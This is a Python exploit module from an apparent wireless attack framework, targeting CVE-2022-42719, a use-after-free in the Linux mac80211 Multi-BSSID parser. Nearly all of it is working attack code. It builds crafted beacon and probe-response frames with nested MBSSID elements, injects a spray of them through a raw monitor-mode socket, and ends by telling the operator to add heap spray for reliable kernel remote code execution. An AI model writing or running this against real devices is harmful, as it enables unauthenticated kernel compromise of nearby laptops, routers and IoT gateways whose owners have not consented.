# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux mac80211 Multi-BSSID Use-After-Free RCE (CVE-2022-42719).

    The mac80211 subsystem in the Linux kernel (5.2 through 5.19.14) contains
    a use-after-free in the parsing of Multi-BSSID elements (IE 71) within
    beacon and probe response frames.

    An attacker within radio range can inject crafted 802.11 frames containing
    nested Multi-BSSID sub-elements that trigger the UAF during BSS info
    processing, achieving kernel-level code execution without any prior
    authentication or association.

    Patched in kernel 5.19.15 and 6.0.1.

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux mac80211 MBSSID Use-After-Free RCE (CVE-2022-42719)",
        "description": (
            "Exploits CVE-2022-42719 via a use-after-free in the mac80211 "
            "Multi-BSSID element parser (IE 71). Crafted 802.11 beacon frames "
            "with deeply nested MBSSID sub-elements cause a freed BSS info "
            "pointer to be reused, enabling kernel code execution from adjacent "
            "radio range. Pre-authentication, no user interaction required."
        ),
        "authors": (
            "Soenke Huster (TU Darmstadt, discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2022-42719",
            "https://www.openwall.com/lists/oss-security/2022/10/13/2",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff05d4b45dd89b922578dac497dcabf57cf771c6",
            "https://openwrt.org/advisory/2022-10-17-1",
        ),
        "devices": (
            "Any Linux device with mac80211 (kernel 5.2 to 5.19.14)",
            "Laptops, embedded routers, IoT gateways running Linux WiFi stack",
        ),
    }

    interface = OptString("wlan0mon", "Wireless interface in monitor mode")
    target_bssid = OptString("", "Target BSSID (XX:XX:XX:XX:XX:XX); empty broadcasts")
    channel = OptInteger(6, "Wi-Fi channel to operate on")
    timeout = OptFloat(3.0, "Socket timeout in seconds")
    nesting_depth = OptInteger(6, "MBSSID nesting depth to trigger UAF (>=3)")
    spray_count = OptInteger(16, "Number of trigger frames to send")

    # 802.11 constants
    _FC_BEACON = 0x0080
    _FC_PROBE_RESPONSE = 0x0050
    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_DS_PARAMETER = 3
    _IE_MULTI_BSSID = 71
    _MBSSID_SUBELEMENT_PROFILE = 0

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\xde\xad\xbe\xef"
    _FAKE_SSID = b"MBSSID_TRIGGER"

    def _mac_to_bytes(self, mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_ie(self, ie_id: int, data: bytes) -> bytes:
        return struct.pack("BB", ie_id, len(data)) + data

    def _build_mbssid_subelement(self, bssid_index: int) -> bytes:
        """Build a Non-Transmitted BSSID Profile sub-element."""
        # Nontransmitted BSSID Capability (2 bytes)
        cap = struct.pack("<H", 0x0401)
        # SSID IE inside profile
        nested_ssid = self._build_ie(self._IE_SSID, f"NEST{bssid_index:02d}".encode())
        # Multiple BSSID Index IE (ID=85)
        bssid_idx_ie = self._build_ie(85, struct.pack("B", bssid_index))
        profile_data = cap + nested_ssid + bssid_idx_ie
        return struct.pack("BB", self._MBSSID_SUBELEMENT_PROFILE, len(profile_data)) + profile_data

    def _build_nested_mbssid(self, depth: int) -> bytes:
        """Build a deeply nested Multi-BSSID element to trigger the UAF.

        The vulnerability is in how mac80211 processes nested MBSSID elements.
        Each nesting level allocates a BSS entry; when the inner element is
        freed during error handling, the outer level still holds a dangling
        pointer to the freed entry.
        """
        if depth <= 0:
            return self._build_mbssid_subelement(depth)

        inner = self._build_nested_mbssid(depth - 1)

        # MaxBSSID Indicator (first byte of MBSSID IE data)
        max_bssid_indicator = struct.pack("B", min(depth + 1, 8))

        # Build profiles that reference memory in a pattern that maximizes
        # the chance of the freed pointer being reused
        profiles = b""
        for i in range(3):
            profiles += self._build_mbssid_subelement(depth * 10 + i)

        # Embed the inner MBSSID as raw data after the profiles to create
        # the nesting that triggers the bug
        ie_data = max_bssid_indicator + profiles + inner

        return self._build_ie(self._IE_MULTI_BSSID, ie_data)

    def _build_beacon_frame(self) -> bytes:
        """Build a complete 802.11 beacon frame with the trigger MBSSID element."""
        dest = self._BROADCAST
        src = self._FAKE_BSSID
        bssid = self._FAKE_BSSID

        # 802.11 header
        fc = struct.pack("<H", self._FC_BEACON)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dest + src + bssid + seq_ctrl

        # Fixed parameters: timestamp(8) + beacon_interval(2) + capability(2)
        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0421)
        fixed = timestamp + beacon_interval + capability

        # Information Elements
        ies = b""
        ies += self._build_ie(self._IE_SSID, self._FAKE_SSID)
        ies += self._build_ie(self._IE_SUPPORTED_RATES, bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]))
        ies += self._build_ie(self._IE_DS_PARAMETER, struct.pack("B", self.channel))

        # The trigger: deeply nested Multi-BSSID element
        ies += self._build_nested_mbssid(self.nesting_depth)

        return header + fixed + ies

    def _build_trigger_frame(self) -> bytes:
        """Build a probe response variant of the trigger (alternative injection vector)."""
        dest = self._mac_to_bytes(self.target_bssid) if self.target_bssid else self._BROADCAST
        src = self._FAKE_BSSID
        bssid = self._FAKE_BSSID

        fc = struct.pack("<H", self._FC_PROBE_RESPONSE)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dest + src + bssid + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0421)
        fixed = timestamp + beacon_interval + capability

        ies = b""
        ies += self._build_ie(self._IE_SSID, self._FAKE_SSID)
        ies += self._build_ie(self._IE_SUPPORTED_RATES, bytes([0x82, 0x84, 0x8B, 0x96]))
        ies += self._build_ie(self._IE_DS_PARAMETER, struct.pack("B", self.channel))
        ies += self._build_nested_mbssid(self.nesting_depth)

        return header + fixed + ies

    def _send_raw(self, frame: bytes) -> bool:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.send(frame)
            sock.close()
            return True
        except OSError as e:
            print_error(f"Raw socket send failed: {e}")
            return False

    def _detect_target(self) -> bool:
        """Listen for beacons/probe responses to confirm a WiFi target is active."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout * 2)
            sock.bind((self.interface, 0))

            deadline = time.time() + self.timeout * 2
            while time.time() < deadline:
                try:
                    data = sock.recv(4096)
                except TimeoutError:
                    break
                if len(data) < 24:
                    continue
                fc = struct.unpack("<H", data[0:2])[0]
                subtype = (fc & 0x00FC) >> 2
                # Beacon (8) or Probe Response (5)
                if subtype in (8, 5):
                    if self.target_bssid:
                        frame_bssid = data[16:22]
                        if frame_bssid == self._mac_to_bytes(self.target_bssid):
                            sock.close()
                            return True
                    else:
                        sock.close()
                        return True
            sock.close()
        except OSError:
            pass
        return False

    def run(self) -> None:
        if not self.check():
            print_error(
                "No active WiFi target detected on the monitor interface. "
                "Ensure the interface is in monitor mode and a target is in range."
            )
            return

        print_success(
            f"WiFi target detected; sending {self.spray_count} MBSSID UAF "
            f"trigger frames (nesting depth {self.nesting_depth})"
        )
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect WiFi targets by listening for beacons on the monitor interface."""
        return self._detect_target()

    def _exploit(self) -> None:
        print_status(
            f"Injecting {self.spray_count} beacon frames with nested MBSSID "
            f"elements on {self.interface} (channel {self.channel})"
        )

        for i in range(self.spray_count):
            # Alternate between beacon and probe response to maximize
            # the chance of hitting the vulnerable code path
            if i % 2 == 0:
                frame = self._build_beacon_frame()
            else:
                frame = self._build_trigger_frame()

            if not self._send_raw(frame):
                print_error(f"Failed to send frame {i + 1}/{self.spray_count}")
                return

            print_info(f"  Frame {i + 1}/{self.spray_count} sent ({len(frame)} bytes)")
            time.sleep(0.02)

        print_success(
            "MBSSID UAF trigger sequence delivered. If the target runs a "
            "vulnerable mac80211 stack (kernel 5.2 to 5.19.14), the BSS "
            "parsing UAF has been triggered. Pair with heap spray primitives "
            "for reliable kernel RCE."
        )
